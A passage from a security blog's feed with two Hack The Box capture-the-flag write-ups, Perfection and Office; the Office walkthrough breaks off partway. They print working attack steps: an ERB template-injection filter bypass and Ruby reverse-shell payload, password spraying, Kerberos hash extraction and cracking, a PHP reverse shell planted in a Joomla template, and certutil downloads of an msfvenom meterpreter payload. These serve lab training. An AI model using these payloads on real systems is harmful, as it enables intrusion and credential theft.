 and <a href="https://www.youtube.com/watch?v=FDCpJbS1OuQ&amp;ab_channel=IppSec" target="_blank" >IppSec</a>

.</p>
]]></content>
        </item>
        
        <item>
            <title>HTB: Perfection</title>
            <link>https://scorpiosec.com/posts/2024/07/htb-perfection/</link>
            <pubDate>Thu, 04 Jul 2024 14:05:10 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/07/htb-perfection/</guid>
            <description>Platform: Hack The Box Link: Perfection Level: Easy OS: Linux Perfection begins with a straightforward website. Through enumeration, we identify a vulnerability to Server-Side Template Injection (SSTI), which we exploit to gain an initial foothold. We then discover a database file containing password hashes, but our initial attempts to crack them are unsuccessful. After reading the user&amp;rsquo;s emails, we learn that the passwords follow a specific format. Using this information, we employ a mask attack with Hashcat and successfully recover the password.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/Perfection" target="_blank" >Perfection</a>

</li>
<li>Level: Easy</li>
<li>OS: Linux</li>
</ul>
<hr>
<p>Perfection begins with a straightforward website. Through enumeration, we identify a vulnerability to Server-Side Template Injection (SSTI), which we exploit to gain an initial foothold. We then discover a database file containing password hashes, but our initial attempts to crack them are unsuccessful. After reading the user&rsquo;s emails, we learn that the passwords follow a specific format. Using this information, we employ a mask attack with Hashcat and successfully recover the password. This allows us to run <code>sudo -l</code> and discover that the sudo rules are highly permissive, enabling us to escalate our privileges without needing a password.</p>
<p>Target IP address - <code>10.10.11.253</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA  nmap/Perfection 10.10.11.253
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-03-25 14:20 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.253
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.051s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx
</span></span><span style="display:flex;"><span>|_http-title: Weighted Grade Calculator
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.06 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<p>The website is a &ldquo;a tool to calculate the total grade in a class based on category scores and percentage weights.&rdquo;</p>
<p>The <code>Calculate your weighted grade</code> page lets you use the tool.</p>
<p><img src="/images/HTB-Perfection/weighed-grade.png" alt="Calculate your weighted grade table"></p>
<p>After filling the table and submitting the grades, we get some weighted grades.</p>
<p><img src="/images/HTB-Perfection/weighed-grade-results.png" alt="Weighted grades"></p>
<p>In the footer we notice that the application is using <code>WEBrick 1.7.0</code>.</p>
<p><img src="/images/HTB-Perfection/WEBrick.png" alt="Website powered by WEBrick 1.7.0"></p>
<p>Searching for vulnerabilities related to this specific version is inconclusive. Attempting directory brute forcing, subdomain, and source code enumeration leads to the same outcome.</p>
<p>Using the <code>Wappalyzer</code> extension reveals that the application is using <code>Ruby 3.0.2</code>.</p>
<p><img src="/images/HTB-Perfection/wappalyzer.png" alt="Wapplyzer results"></p>
<p>Since the application accepts user input we can try some injections attacks. Let&rsquo;s refill the table, capture the request with Burp Suite and send it to the repeater.</p>
<p>The first test is with <code>; ls</code> as the value for <code>category1</code>.</p>
<p><img src="/images/HTB-Perfection/injection-attack.png" alt="Request in Burp for injection attack"></p>
<p>It returns <code>Malicious input blocked</code>. Trying various payloads create the same result, there is an input filter that we need to bypass.</p>
<p><img src="/images/HTB-Perfection/injection-blocked.png" alt="Injection blocked"></p>
<p>On the <code>WEBrick</code> github page, we learn that it can handle different things. <em>Read more <a href="https://github.com/ruby/webrick" target="_blank" >here</a>

.</em></p>
<p><img src="/images/HTB-Perfection/WEBrick-github.png" alt="WEBrick github page"></p>
<p>We also learn that ERB is a templating system for Ruby. <em>Read more <a href="https://github.com/ruby/erb" target="_blank" >here</a>

.</em></p>
<p><img src="/images/HTB-Perfection/ERB-template.png" alt="ERB-template page"></p>
<p>Being unfamiliar with those technologies I ask ChatGPT how to check if a server is using the Ruby ERB templating system. We will use the third option.</p>
<p><img src="/images/HTB-Perfection/ERB-test.png" alt="ERB tests"></p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>Trying the payload provided, I get the message:</p>
<p><code>Invalid query parameters: invalid %-encoding (&amp;amp;lt;%= 2 + 2 %&amp;amp;gt;)</code>.</p>
<p>After a few modifications the payload successfully works! The filter can be bypassed by using <code>%0A</code> (for a new line) and URL-encoding.</p>
<blockquote>
<p>Payload used for the test: <code>%0A&lt;%25%3d+2+%2b+2+%25&gt;</code></p>
</blockquote>
<p><img src="/images/HTB-Perfection/SSTI-working.png" alt="Successful SSTI test"></p>
<p>This confirms that the target is vulnerable to <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby" target="_blank" >SSTI</a>

 and is indeed using Ruby ERB. This means that we can execute a reverse shell and gain a foothold.</p>
<p>Below is the payload (ruby) used to get a reverse shell, it is from <a href="https://www.revshells.com/" target="_blank" >revshells</a>

.</p>
<p><strong>Full payload used for the reverse shell</strong></p>
<pre tabindex="0"><code>Chemistry%0A&lt;%25%3d+`ruby+-rsocket+-e&#39;spawn(&#34;sh&#34;,[%3ain,%3aout,%3aerr]%3d&gt;TCPSocket.new(&#34;10.10.15.4&#34;,1337))&#39;`+%25&gt;
</code></pre><p><img src="/images/HTB-Perfection/ruby-revshell.png" alt="Ruby reverse shell"></p>
<p>We are able to access the system and are connected as the user <code>susan</code>. We upgrade the shell with the commands below.</p>
<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
</code></pre><p><img src="/images/HTB-Perfection/foothold.png" alt="Foothold"></p>
<p>The user flag is found in <code>/home/susan</code>.</p>
<p><img src="/images/HTB-Perfection/user-flag.png" alt="User flag location"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>We use <code>linpeas.sh</code> to find privilege escalation paths and find some useful information.</p>
<ul>
<li><code>susan</code> is a sudoer</li>
</ul>
<p><img src="/images/HTB-Perfection/susan-sudoer.png" alt="User susan is a sudoer"></p>
<ul>
<li>credentials files are found</li>
</ul>
<p><img src="/images/HTB-Perfection/susan-credentials.png" alt="Credentials files are found"></p>
<ul>
<li>The user also has some mail, which might be worth checking out</li>
</ul>
<p><img src="/images/HTB-Perfection/susan-mail.png" alt="The user has some mail"></p>
<p>Running <code>sudo -l</code> requires a password.</p>
<p><img src="/images/HTB-Perfection/susan-privesc.png" alt="sudo -l requires password"></p>
<p>The credentials file give us some users hashes including <code>susan</code>&rsquo;s.</p>
<pre tabindex="0"><code>strings /home/susan/Migration/pupilpath_credentials.db
</code></pre><p><img src="/images/HTB-Perfection/susan-hash.png" alt="susan hash"></p>
<pre tabindex="0"><code>hashid &#39;abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f&#39;
</code></pre><p>Running <code>hashid</code> reveals that this is a SHA-256 hash. Using hashcat on the hash fails, it seems that it cannot be cracked yet.</p>
<p>After reading the mail we find the password structure.</p>
<p><img src="/images/HTB-Perfection/susan-mail1.png" alt="Reading susan mail"></p>
<p>We try a mask attack and successfully recover the password <code>susan_nasus_413759210</code>.</p>
<blockquote>
<p>In a mask attack we know about the passwords designs. You can learn more about it <a href="https://hashcat.net/wiki/doku.php?id=mask_attack#mask_attack" target="_blank" >here</a>

.</p>
</blockquote>
<pre tabindex="0"><code>hashcat -m 1400 hash.txt -a 3 -d 1 susan_nasus_?d?d?d?d?d?d?d?d?d
</code></pre><p><img src="/images/HTB-Perfection/password-recovered.png" alt="Reading susan mail"></p>
<p>With that password we log in with SSH. Running <code>sudo -l</code> we see that we have a straight path to root.</p>
<p><img src="/images/HTB-Perfection/sudo-l.png" alt="sudo -l command"></p>
<p>We have a very permissive rule allowing the user <code>susan</code> to run any command, as any user or group which effectively gives them full administrative control when using <code>sudo</code>.</p>
<p>By running <code>sudo su</code> we get a root shell and find the root flag in <code>/root</code>.</p>
<p><img src="/images/HTB-Perfection/root-flag.png" alt="root flag"></p>
<p>Thanks for reading my blog and I hope this write up was helpful to you!</p>
]]></content>
        </item>
        
        <item>
            <title>HTB: Office</title>
            <link>https://scorpiosec.com/posts/2024/06/htb-office/</link>
            <pubDate>Wed, 19 Jun 2024 23:28:44 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/06/htb-office/</guid>
            <description>Platform: Hack The Box Link: Office Level: Hard OS: Windows The Office box is a Windows Server 2022 running as a domain controller. The website hosted on the web server uses an outdated version of Joomla, which is vulnerable to CVE-2023-23752. By exploiting this vulnerability, we leak the MySQL database password. After some enumeration, we find a valid username for the password, granting us access to a shared folder containing a pcap file.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/Office" target="_blank" >Office</a>

</li>
<li>Level: Hard</li>
<li>OS: Windows</li>
</ul>
<hr>
<p>The Office box is a Windows Server 2022 running as a domain controller. The website hosted on the web server uses an outdated version of Joomla, which is vulnerable to <code>CVE-2023-23752</code>. By exploiting this vulnerability, we leak the MySQL database password. After some enumeration, we find a valid username for the password, granting us access to a shared folder containing a pcap file.</p>
<p>Loading the pcap file into Wireshark, we discover an <code>AS-REQ</code> frame containing all the necessary information to construct a hash. Using hashcat, we recover a password that allows us to access the Joomla Dashboard. By inserting a PHP reverse shell into a Joomla template, we obtain our initial foothold. From this first shell, we move laterally to another user and retrieve the user flag.</p>
<p>Using Bloodhound, we learn that one of the users has the <code>CanPSRemote</code> permission and is also a member of the <code>GPO Managers</code> group. We achieve another lateral movement by exploiting an outdated version of LibreOffice via <code>CVE-2023-2255</code>, uploading a malicious <code>.odt</code> file to an internal website. Our final lateral movement is accomplished by decrypting some DPAPI credential files with Mimikatz, which yields the password of the user with the loose permissions. Finally, we exploit the lax configuration by adding the user to the Administrators group, allowing us to read the root flag.</p>
<p>Target IP address - <code>10.10.11.3</code></p>
<h2 id="scanning">Scanning</h2>
<p>A bash script is used for the scanning process, you can find it <a href="https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh" target="_blank" >here</a>

.</p>
<pre tabindex="0"><code>./nmap_scan.sh 10.10.11.3 Office
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389,49664,49668,51552,51567,51587,51639
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-06-20 00:30 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> office.htb <span style="color:#f92672">(</span>10.10.11.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.066s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span>80/tcp    open  http          Apache httpd 2.4.56 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1t PHP/8.0.28<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">16</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| /joomla/administrator/ /administrator/ /api/ /bin/ 
</span></span><span style="display:flex;"><span>| /cache/ /cli/ /components/ /includes/ /installation/ 
</span></span><span style="display:flex;"><span>|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.56 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1t PHP/8.0.28
</span></span><span style="display:flex;"><span>|_http-generator: Joomla! - Open Source Content Management
</span></span><span style="display:flex;"><span>|_http-title: Home
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-06-20 13:30:27Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC.office.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2023-05-10T12:36:58
</span></span><span style="display:flex;"><span>|_Not valid after:  2024-05-09T12:36:58
</span></span><span style="display:flex;"><span>443/tcp   open  ssl/http      Apache httpd 2.4.56 <span style="color:#f92672">(</span>OpenSSL/1.1.1t PHP/8.0.28<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.56 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1t PHP/8.0.28
</span></span><span style="display:flex;"><span>| tls-alpn: 
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost
</span></span><span style="display:flex;"><span>| Not valid before: 2009-11-10T23:48:47
</span></span><span style="display:flex;"><span>|_Not valid after:  2019-11-08T23:48:47
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC.office.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2023-05-10T12:36:58
</span></span><span style="display:flex;"><span>|_Not valid after:  2024-05-09T12:36:58
</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC.office.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2023-05-10T12:36:58
</span></span><span style="display:flex;"><span>|_Not valid after:  2024-05-09T12:36:58
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC.office.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2023-05-10T12:36:58
</span></span><span style="display:flex;"><span>|_Not valid after:  2024-05-09T12:36:58
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49668/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>51552/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>51567/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>51587/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>51639/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2024-06-20T13:31:17
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>|_clock-skew: mean: 7h59m42s, deviation: 0s, median: 7h59m41s
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 99.29 seconds
</span></span></code></pre></div><p>We are dealing with a domain controller named <code>office.htb</code>. Let&rsquo;s update the <code>/etc/hosts</code> file.</p>
<pre tabindex="0"><code>sudo echo &#34;10.10.11.3 office.htb dc.office.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id="enumeration">Enumeration</h2>
<p>Visiting <code>http://office.htb/</code> we find a blog about Iron Man armors.</p>
<p><img src="/images/HTB-Office/office-blog.png" alt="Office blog website"></p>
<p>Thanks to wappalyzer we find out that the website uses Joomla. We could search for vulnerabilities for that CMS but without a software version we are playing a guessing game.</p>
<p><img src="/images/HTB-Office/wappalyzer.png" alt="Office - Wappalyzer results"></p>
<p>We recall that we saw a <code>robots.txt</code> file in the nmap results.</p>
<p><img src="/images/HTB-Office/robots-txt.png" alt="Office - robots.txt"></p>
<p>Several directories are discovered.</p>
<p><img src="/images/HTB-Office/endpoints-found.png" alt="robots.txt directories"></p>
<p><code>http://office.htb/administrator/</code> leads us to the Joomla Administrator Login page; however, we still lack the credentials.</p>
<p><img src="/images/HTB-Office/Joomla-admin-login.png" alt="Joomla admin panel"></p>
<p>On <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#version" target="_blank" >this</a>

 HackTricks page we learn a few ways to obtain the version of Joomla and we obtain it by going to <code>http://office.htb//administrator/manifests/files/joomla.xml</code>.</p>
<p><img src="/images/HTB-Office/Joomla-version.png" alt="Joomla version"></p>
<p>For this version we find <a href="https://vulncheck.com/blog/joomla-for-rce" target="_blank" >CVE-2023-23752</a>

 which is an information leakage vulnerability. A PoC is available <a href="https://github.com/0xNahim/CVE-2023-23752" target="_blank" >here</a>

.</p>
<p>After running <code>python3 exploit.py -u http://office.htb</code> we get the MySQL root password <code>H0lOgrams4reTakIng0Ver754!</code>.</p>
<p><img src="/images/HTB-Office/joomla-creds.png" alt="DB password recovered"></p>
<p>Trying to login with <code>administrator:H0lOgrams4reTakIng0Ver754!</code> fails, so we need to find another way to use this password. We know from the nmap scan results that Kerberos is running on port 88, let&rsquo;s use <a href="https://github.com/ropnop/kerbrute" target="_blank" >kerbrute</a>

 to enumerate valid accounts.</p>
<pre tabindex="0"><code>kerbrute userenum --dc office.htb -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
</code></pre><p><img src="/images/HTB-Office/valid-users.png" alt="Valid usernames found with Kerbrute"></p>
<p>Now with the list of valid users we can spray the password in order to get a valid username.</p>
<pre tabindex="0"><code>kerbrute passwordspray --dc office.htb -d office.htb usernames &#39;H0lOgrams4reTakIng0Ver754!&#39;
</code></pre><p><img src="/images/HTB-Office/login-sucess.png" alt="Valid credential pair"></p>
<p>We find that <code>dwolfe@office.htb:H0lOgrams4reTakIng0Ver754!</code> works.</p>
<p>With impacket we login into smb and we notice a share called <code>SOC Analysis</code>, containing a pcap file named <code>Latest-System-Dump-8fbc124d.pcap</code> which we download.</p>
<pre tabindex="0"><code>impacket-smbclient dwolfe:&#39;H0lOgrams4reTakIng0Ver754!&#39;@10.10.11.3
</code></pre><p><img src="/images/HTB-Office/share-access.png" alt="SMB login and SOC Analysis share"></p>
<p>After loading the pcap file and filtering for <code>kerberos</code> we discover some valuable information.</p>
<p><img src="/images/HTB-Office/pcap.png" alt="Kerberos pcap file"></p>
<blockquote>
<p>When a user requests a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC), a process known as AS-REQ (Authentication Service Request) is used. Part of this process involves the user proving their identity to the KDC. During the AS-REQ, the client (user) sends a timestamp encrypted with their NTLM hash (which is derived from their password). This proves they know the password without sending it directly.</p>
</blockquote>
<p>We can extract the password hash from the pcap file and then use hashcat to crack it. Because hashcat has several modules for Kerberos hashes we need to use the correct format. Let&rsquo;s review the information we have:</p>
<ul>
<li>The presence of the <code>PA-DATA</code> fields, which are used for pre-authentication confirms that we are dealing with Kerberos pre-authentication packets.</li>
<li>The etype (encryption type) is specified as <code>18</code> and it also uses AES-256.</li>
<li>We have the cipher (NTLM hash) used to encrypt the timestamp.</li>
<li>We have the user name (<code>CNameString = tstark</code>) and the domain name (<code>realm = OFFICE.HTB</code>).</li>
</ul>
<p>With that intel we find that the corresponding hash should follow this format <code>$krb5pa$18$user$realm$cipher</code>. It corresponds to module 19900 in hashcat which you can verify <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" >here</a>

.</p>
<p>We will use a Bash script to get the hash.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>filter<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>tshark -r $1 -Y <span style="color:#e6db74">&#34;kerberos.msg_type == 10 &amp;&amp; kerberos.cipher &amp;&amp; kerberos.realm &amp;&amp; kerberos.CNameString&#34;</span> -T fields -e kerberos.CNameString -e kerberos.realm -e kerberos.cipher -E separator<span style="color:#f92672">=</span>$ <span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>echo $filter | tr <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#e6db74">&#39;\n&#39;</span><span style="color:#66d9ef">)</span> ; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;\$krb5pa\$18\$</span>$i<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><p><img src="/images/HTB-Office/kerberos-hash.png" alt="Kerberos hash found"></p>
<p>Using hashcat we recover the password <code>playboy69</code>.</p>
<pre tabindex="0"><code>hashcat -m 19900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src="/images/HTB-Office/hash-cracked.png" alt="Kerberos hash cracked with hashcat"></p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>With the credentials <code>administrator:playboy69</code> we log into the Joomla dashboard, we are logged in as <code>Tony Stark</code>.</p>
<p><img src="/images/HTB-Office/joomla-dashboard.png" alt="Joomla Dashboard"></p>
<p>As is usual with CMS software, we can modify templates with some custom code. We exploit this to get a reverse shell. Go to <code>System</code> &ndash;&gt; <code>Site Templates</code> &ndash;&gt; click <code>Cassiopeia Details and Files</code> &ndash;&gt; overwrite <code>error.php</code> with a PHP reverse shell which you can find on <a href="https://www.revshells.com/" target="_blank" >revshells</a>

 &ndash;&gt; Save and Close &ndash;&gt; finally visit <code>http://office.htb/templates/cassiopeia/error.php</code> to trigger the reverse shell.</p>
<p>On the listener we get a shell as <code>web_account</code>.</p>
<p><img src="/images/HTB-Office/shell-office.png" alt="Initial foothold, shell as web_account"></p>
<h3 id="first-lateral-movement">First Lateral Movement</h3>
<p>We cannot read the user flag with this account but we can switch to the <code>tstark</code> user. Since we already have the correct credentials we can use <a href="https://github.com/antonioCoco/RunasCs" target="_blank" >runascs</a>

 to access the account, we will use a meterpreter shell.</p>
<pre tabindex="0"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP_ADDRESS&gt; LPORT=&lt;PORT_NUMBER&gt; -f exe -o payload.exe
</code></pre><p><img src="/images/HTB-Office/msfvenom-cmd.png" alt="malicious file generated with msfvenom"></p>
<p>After sending both files to the target we set up the handler in Metasploit.</p>
<pre tabindex="0"><code>certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT/RunasCs.exe runascs.exe

certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT/payload.exe payload.exe
</code></pre><pre tabindex="0"><code>use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost &lt;IP_ADDRESS&gt;
set lport &lt;PORT_NUMBERS&gt;
run
</code></pre><p>And running RunasCs with our malicious file we get a meterpreter shell.</p>
<pre tabindex="0"><code>runascs.exe tstark playboy69 payload.exe
</code></pre><p><img src="/images/HTB-Office/runascs-cmd.png" alt="runascs command"></p>
<p><img src="/images/HTB-Office/tstark-meterpreter.png" alt="tstark meterpreter shell"></p>
<p>The user flag is found in <code>C:\Users\tstark\Desktop</code>.</p>
<p><img src="/images/HTB-Office/user-flag-metasploit.png" alt="user flag location"></p>
<p>Additionally we notice two more users on the system.</p>
<p><img src="/images/HTB-Office/Users-list.png" alt="users directory on target system"></p>
<h3 id="active-directory-enumeration">Active Directory Enumeration</h3>
<p>Knowing that we are dealing with a Domain Controller let&rsquo;s use Bloodhound to enumerate.</p>
<p><img src="/images/HTB-Office/bloodhound-cmd.png" alt="Bloodhound command"></p>
<pre tabindex="0"><code>bloodhound-python -c all -u tstark -p &#39;playboy69&#39; -d office.htb -dc dc.office.htb -ns 10.10.11.3
</code></pre><p>After it finishes collecting data, we can launch Bloodhound</p>
<pre tabindex="0"><code>sudo neo4j start

bloodhound --no-sandbox
</code></pre><p>When Bloodhound launches, we use the <code>Upload Data</code> button on the right.</p>
<p><img src="/images/HTB-Office/upload-data-bloodhound.png" alt="Upload data in Bloodhound"></p>
<p>Then select all the json files created by Bloodhound and the information will be imported.</p>
<p><img src="/images/HTB-Office/bloodhound-files.png" alt="Bloodhound json files"></p>
<p>We discover that the <code>HHogan</code> user has the <code>CanPSRemote</code> permission allowing him to initiate remote sessions on the target. In our case <code>evil-winrm</code> can be used for that.</p>
